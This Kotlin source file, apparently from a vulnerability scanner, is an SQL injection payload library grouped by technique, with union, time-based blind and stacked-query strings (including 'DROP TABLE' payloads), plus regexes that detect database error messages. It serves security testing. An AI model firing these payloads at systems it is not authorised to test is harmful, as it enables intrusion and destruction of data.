package sqli

/**
 * SQL injection payload library organized by injection technique.
 */
object SqlPayloads {

    /** Classic tautology-based payloads */
    val tautology = listOf(
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "\" OR \"1\"=\"1",
        "\" OR \"1\"=\"1\" --",
        "' OR 1=1 --",
        "' OR 1=1#",
        "admin' --",
        "admin' #",
        "' OR 'x'='x",
    )

    /** Union-based payloads */
    val union = listOf(
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "1 UNION SELECT NULL--",
    )

    /** Error-based payloads (trigger SQL syntax errors) */
    val errorBased = listOf(
        "'",
        "\"",
        "' AND 1=CONVERT(int, @@version)--",
        "';",
        "\"'",
        "' OR ''='",
    )

    /** Time-based blind payloads */
    val timeBased = listOf(
        "' OR SLEEP(3)--",
        "' OR pg_sleep(3)--",
        "'; WAITFOR DELAY '0:0:3'--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
    )

    /** Boolean-based blind payloads */
    val booleanBased = listOf(
        "' AND 1=1 AND '1'='1",
        "' AND 1=2 AND '1'='1",
        "' AND 1=1--",
        "' AND 1=2--",
    )

    /** Stacked query payloads */
    val stacked = listOf(
        "'; DROP TABLE test--",
        "'; SELECT 1--",
        "1; DROP TABLE test--",
    )

    /** Numeric injection payloads */
    val numeric = listOf(
        "1 OR 1=1",
        "1 OR 1=1--",
        "1' OR '1'='1",
    )

    /** All payloads combined */
    val all: List<String> = tautology + union + errorBased + timeBased + booleanBased + stacked + numeric

    /** SQL error patterns that indicate a potential vulnerability */
    val errorPatterns = listOf(
        Regex("you have an error in your sql syntax", RegexOption.IGNORE_CASE),
        Regex("warning.*mysql", RegexOption.IGNORE_CASE),
        Regex("unclosed quotation mark", RegexOption.IGNORE_CASE),
        Regex("quoted string not properly terminated", RegexOption.IGNORE_CASE),
        Regex("microsoft ole db provider for sql server", RegexOption.IGNORE_CASE),
        Regex("microsoft sql native client error", RegexOption.IGNORE_CASE),
        Regex("odbc sql server driver", RegexOption.IGNORE_CASE),
        Regex("ora-\\d{5}", RegexOption.IGNORE_CASE),
        Regex("oracle error", RegexOption.IGNORE_CASE),
        Regex("pg_query\\(\\)", RegexOption.IGNORE_CASE),
        Regex("pg_exec\\(\\)", RegexOption.IGNORE_CASE),
        Regex("postgresql.*error", RegexOption.IGNORE_CASE),
        Regex("psycopg2", RegexOption.IGNORE_CASE),
        Regex("sqlstate\\[", RegexOption.IGNORE_CASE),
        Regex("sqlite.*error", RegexOption.IGNORE_CASE),
        Regex("sqlite3\\.operationalerror", RegexOption.IGNORE_CASE),
        Regex("sql syntax.*mysql", RegexOption.IGNORE_CASE),
        Regex("valid mysql result", RegexOption.IGNORE_CASE),
        Regex("mysql_fetch", RegexOption.IGNORE_CASE),
        Regex("mysql_num_rows", RegexOption.IGNORE_CASE),
        Regex("sql command not properly ended", RegexOption.IGNORE_CASE),
        Regex("unterminated string literal", RegexOption.IGNORE_CASE),
        Regex("syntax error.*sql", RegexOption.IGNORE_CASE),
        Regex("unexpected end of sql command", RegexOption.IGNORE_CASE),
        Regex("dynamic sql error", RegexOption.IGNORE_CASE),
        Regex("com\\.mysql\\.jdbc", RegexOption.IGNORE_CASE),
        Regex("java\\.sql\\.sqlexception", RegexOption.IGNORE_CASE),
        Regex("org\\.postgresql\\.util\\.psqlexception", RegexOption.IGNORE_CASE),
        Regex("javax\\.persistence", RegexOption.IGNORE_CASE),
        Regex("hibernate.*exception", RegexOption.IGNORE_CASE),
        Regex("sqlalchemy\\.exc", RegexOption.IGNORE_CASE),
        Regex("database error", RegexOption.IGNORE_CASE),
        Regex("sql error", RegexOption.IGNORE_CASE),
    )
}
